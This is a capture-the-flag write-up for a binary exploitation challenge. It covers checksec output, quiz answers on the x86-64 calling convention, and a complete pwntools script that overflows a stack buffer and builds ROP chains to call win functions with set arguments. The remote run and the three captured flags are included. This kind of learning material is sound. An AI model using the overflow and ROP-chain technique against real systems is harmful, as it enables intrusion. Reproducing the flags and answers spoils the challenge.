	# iq-test

Was provided with a file called `chall`. 

`file` and `checksec` output: 

```
➜  ~/Documents/recruitment/haard_phase2/binex/iqtest-binex/src git:(main) ✗ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b4159fa444155752857ce51af35f2c5e769625c6, for GNU/Linux 3.2.0, not stripped
➜  ~/Documents/recruitment/haard_phase2/binex/iqtest-binex/src git:(main) ✗ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   83 Symbols	  No	0		3		chall
```

As we can see, the given file is a 64 bit ELF with absolutely no stack protections.  

Lets run the program and see what it does: 

```
=========== Welcome to the Exploitation Dojo ==============
You must first prove your knowledge if you want access to my secrets
Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left-to-right. True or False?
[1] True
[2] False
> 2
Correct!
Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?
[1] RDI
[2] RSI
[3] RAX
[4] RCX
> 1
Correct!
Question 3: In an x86-64 Linux architecture, where is the return value of a function typically stored?
[1] RDX
[2] RSP
[3] RBP
[4] RAX
> 4
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
```

I answered the first three questions after researching on Google and Wikipedia. 

For `Lesson 1` I had to jump to the function at the given address. 

As we know, there are no stack protections implemented on this binary file, so we can easily jump to this location by passing a byte array with appropriate offset padding.  

Payload for the first lesson: 
```python
offset0 = 152
payload1 = b'A'*offset0 + p64(pop_ret) + p64(0x401401) 
```

 I found the offset by trial and error, but best way is using `pattern create` and `pattern search`. 

After running this payload using `pwntools`, I reached Lesson 2. 

```
You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue:
```

For this challenge, I had to run the function `win2` with the argument `0xdeadbeef`. With the video mentioned in the references, I had to make a `ROP` chain and run the mentioned function. 

To pass in the argument, I have to overwrite the `RDI` register with `0xdeadbeef`. On a 64 Bit ELF, the only way to achieve that is using a `ROP` Chain 

Here's the decompilation of the `win2` function. 

```c
__int64 __fastcall win2(int a1)
{
  char v2[8]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v3; // [rsp+18h] [rbp-28h]
  char s[13]; // [rsp+2Ah] [rbp-16h] BYREF
  char v5; // [rsp+37h] [rbp-9h]
  FILE *stream; // [rsp+38h] [rbp-8h]

  if ( a1 != -559038737 )
  {
    puts("You have failed to bring the artifact to the this temple. Return and try again");
    exit(1);
  }
  sprintf(s, "%X.txt", -559038737);

```

As we can see, we have to make `a1` = `0xdeadbeef`. 

This is the payload I wrote for this lesson: 

```python
offset1 = 40

payload2 = b'A'*offset1 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(addr_win2) 
```

Found the offset using `pattern create` and `pattern search` commands of `gef`. 

After running this payload, I proceeded to the final lesson. 

```
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test:
```

For the final test, I had to run the `win3` function (which I found out after decompilation of the program using IDA) with 3 arguments `0xdeadbeef`, `0xdeafface` and `0xfeedcafe`. 

That can be done by overwriting the `RDI`, `RSI` and the `RDX` registers. 

```python 
offset2 = 56

payload3 = b'A'*offset2 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(pop_rsi_rop) + p64(0xdeafface) + p64(pop_rdx_rop) + p64(0xfeedcafe) + p64(addr_win3) 
```

**Note:**
- I found the addresses of the `ROP` gadget using the program `ROPgadget`. Command used:  
  ```
  > ROPgadget --binary ./chall
  ```
- I had to add a `ret` gadget in each payload to align the stack of the remote system, locally, this script works without the additional `ret` gadget.  

Final script:  
```python
from pwn import * 
import time

#context.arch = 'amd64'
#context.log_level = 'debug'

elf = ELF('./chall')

#p = remote('localhost', 6161)

#p = process('./chall')

p = remote('iqtest.nitephase.live', 51823)


addr_win2 = 0x401314
addr_win3 = 0x4011e6

pop_rdi_rop = 0x4017d6
pop_rsi_rop = 0x4017d8
pop_rdx_rop = 0x4017da

pop_ret = 0x40101a

offset0 = 152
offset1 = 40 
offset2 = 56

payload1 = b'A'*offset0 + p64(pop_ret) + p64(0x401401) 

payload2 = b'A'*offset1 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(addr_win2) 

payload3 = b'A'*offset2 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(pop_rsi_rop) + p64(0xdeafface) + p64(pop_rdx_rop) + p64(0xfeedcafe) + p64(addr_win3) 

p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'>', b'4')

print(p.recvuntil(b'address: 0x401401'))
p.sendline(payload1)

#print(p.recvuntil(b'Continue: \n'))

#gdb.attach(p, "b win2")   

time.sleep(0.5)
p.sendline(payload2)


#print(p.recvuntil(b'Final Test: '))

#gdb.attach(p, "b win3")

time.sleep(0.5)
p.sendline(payload3)


p.interactive()
```

Output: 

```
[*] '/home/haard/Documents/recruitment/haard_phase2/binex/iqtest-binex/src/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
b' Correct!\nYou may have passed my test but I must see you display your knowledge before you can access my secrets\nLesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401'
[*] Switching to interactive mode

You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue:
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test:
Congratulations. You are deserving of you reward

nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to iqtest.nitephase.live port 51823
```


**flags:**
- `nite{d1d_1_g3t_th3_fl4g?}`
- `nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}`
- `nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}`


References: 
- https://www.youtube.com/watch?v=vO1Uj2v3r7I
 